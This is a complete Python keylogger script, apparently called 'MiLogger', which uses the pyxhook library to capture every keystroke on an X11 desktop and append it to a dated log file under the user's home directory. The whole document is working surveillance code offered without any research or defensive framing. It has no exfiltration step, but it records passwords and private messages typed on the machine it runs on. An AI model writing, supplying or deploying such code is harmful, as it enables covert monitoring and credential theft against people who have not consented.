import errno
import os
import pyxhook
from datetime import datetime

directory_name = 'MiLogger'
log_file = os.environ.get(
    'mi_logger',
    os.path.expanduser('~/{0}/{1}.log'.format(directory_name, datetime.now().strftime('%d-%m-%Y')))
)


def create_new_folder(folder_path):
    try:
        os.makedirs(folder_path)
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise


def on_key_press(event):
    with open(log_file, 'a+') as log_file_content:
        log_file_content.write('{} '.format(event.Key))


create_new_folder(os.path.expanduser('~/{}'.format(directory_name)))

hook_manager = pyxhook.HookManager()
hook_manager.KeyDown = on_key_press
hook_manager.HookKeyboard()

try:
    hook_manager.start()
except KeyboardInterrupt:
    with open(log_file, 'a+') as file:
        file.write('\nClosed from command line!')
except Exception as ex:
    with open(log_file, 'a+') as file:
        file.write('\nError while catching events: \n {}'.format(ex))
